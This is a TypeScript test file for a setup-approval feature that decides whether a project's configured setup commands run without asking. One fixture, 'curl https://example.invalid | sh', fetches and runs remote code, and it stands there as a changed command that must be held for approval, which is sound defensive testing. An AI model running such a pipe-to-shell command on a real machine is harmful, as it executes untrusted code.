import { afterEach, describe, expect, test } from "bun:test";
import { mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";

import {
  evaluateSetupTrust,
  parseSetupLocalCommands,
  readDefaultBranchSetupCommands,
  readSetupLocalCommands,
  setupCommandsHash,
  type GitBlobReader,
} from "./setup-approval.js";

const directories: string[] = [];
async function tempDir(): Promise<string> {
  const directory = await mkdtemp(path.join(tmpdir(), "ork-setup-approval-"));
  directories.push(directory);
  return directory;
}
afterEach(async () => {
  await Promise.all(directories.splice(0).map((dir) => rm(dir, { recursive: true, force: true })));
});

function blobs(entries: Record<string, string | null>): GitBlobReader {
  return async (_projectPath, ref) => (ref in entries ? entries[ref]! : null);
}

function approvals(approved: string[] = []) {
  return {
    setupApprovals: {
      isSetupCommandsApproved: (_projectId: string, hash: string) => approved.includes(hash),
      approveSetupCommands: () => undefined,
    },
  };
}

describe("setupLocal commands", () => {
  test("a string or an array of non-blank strings", () => {
    expect(parseSetupLocalCommands('{"setupLocal":"mise run setup"}')).toEqual(["mise run setup"]);
    expect(parseSetupLocalCommands('{"setupLocal":["a"," ",3,"b"]}')).toEqual(["a", "b"]);
    expect(parseSetupLocalCommands('{"setupLocal":"  "}')).toEqual([]);
    expect(parseSetupLocalCommands('{"run":["x"]}')).toEqual([]);
    expect(parseSetupLocalCommands("null")).toEqual([]);
  });

  test("a worktree without the file has none", async () => {
    expect(await readSetupLocalCommands(await tempDir())).toEqual([]);
  });

  test("the file is read only when it is a regular file, not a link", async () => {
    const worktree = await tempDir();
    const elsewhere = await tempDir();
    await writeFile(path.join(elsewhere, "other.json"), '{"setupLocal":"echo linked"}');
    await symlink(path.join(elsewhere, "other.json"), path.join(worktree, "orkestrator-ai.json"));
    await expect(readSetupLocalCommands(worktree)).rejects.toThrow("is a link");

    const plain = await tempDir();
    await writeFile(path.join(plain, "orkestrator-ai.json"), '{"setupLocal":["bun install"]}');
    expect(await readSetupLocalCommands(plain)).toEqual(["bun install"]);
  });

  test("the hash is the exact list: order and text", () => {
    expect(setupCommandsHash(["a", "b"])).toMatch(/^[0-9a-f]{64}$/);
    expect(setupCommandsHash(["a", "b"])).toBe(setupCommandsHash(["a", "b"]));
    expect(setupCommandsHash(["a", "b"])).not.toBe(setupCommandsHash(["b", "a"]));
    expect(setupCommandsHash(["a b"])).not.toBe(setupCommandsHash(["a", "b"]));
  });
});

describe("the default branch's setup commands", () => {
  test("the remote-tracking branch first, then the local one", async () => {
    expect(
      await readDefaultBranchSetupCommands(
        "/repo",
        "main",
        blobs({
          "refs/remotes/origin/main": '{"setupLocal":"remote"}',
          "refs/heads/main": '{"setupLocal":"local"}',
        }),
      ),
    ).toEqual(["remote"]);
    expect(
      await readDefaultBranchSetupCommands(
        "/repo",
        "main",
        blobs({ "refs/heads/main": '{"setupLocal":"local"}' }),
      ),
    ).toEqual(["local"]);
  });

  test("a branch without the file runs nothing; an unreadable one is no source", async () => {
    expect(
      await readDefaultBranchSetupCommands(
        "/repo",
        "main",
        blobs({ "refs/remotes/origin/main": "" }),
      ),
    ).toEqual([]);
    expect(await readDefaultBranchSetupCommands("/repo", "main", blobs({}))).toBeNull();
    expect(
      await readDefaultBranchSetupCommands(
        "/repo",
        "main",
        blobs({ "refs/remotes/origin/main": "{not json" }),
      ),
    ).toBeNull();
    // A name git would read as an option is never passed to it.
    expect(await readDefaultBranchSetupCommands("/repo", "--output=x", blobs({}))).toBeNull();
  });
});

describe("whether setup commands run unasked", () => {
  const base = { projectId: "p1", projectPath: "/repo", defaultBranch: "main" };
  const main = blobs({ "refs/remotes/origin/main": '{"setupLocal":["bun install"]}' });

  test("the default branch's commands run", async () => {
    expect(
      await evaluateSetupTrust({ ...base, commands: ["bun install"] }, approvals(), main),
    ).toEqual({ trusted: true, source: "default-branch" });
  });

  test("changed commands are held, with the hash to approve", async () => {
    const commands = ["bun install", "curl https://example.invalid | sh"];
    expect(await evaluateSetupTrust({ ...base, commands }, approvals(), main)).toEqual({
      trusted: false,
      hash: setupCommandsHash(commands),
    });
  });

  test("commands approved for the project on this machine run", async () => {
    const commands = ["make bootstrap"];
    expect(
      await evaluateSetupTrust(
        { ...base, commands },
        approvals([setupCommandsHash(commands)]),
        main,
      ),
    ).toEqual({ trusted: true, source: "approved" });
  });

  test("a run-once approval admits only the commands it names", async () => {
    const commands = ["make bootstrap"];
    expect(
      await evaluateSetupTrust(
        { ...base, commands, approvedHash: setupCommandsHash(commands) },
        approvals(),
        main,
      ),
    ).toEqual({ trusted: true, source: "approved-now" });
    expect(
      await evaluateSetupTrust(
        { ...base, commands, approvedHash: setupCommandsHash(["something else"]) },
        approvals(),
        main,
      ),
    ).toMatchObject({ trusted: false });
  });

  test("a project without a checkout has only its approvals", async () => {
    expect(
      await evaluateSetupTrust(
        { ...base, projectPath: null, commands: ["bun install"] },
        approvals(),
        main,
      ),
    ).toMatchObject({ trusted: false });
  });
});
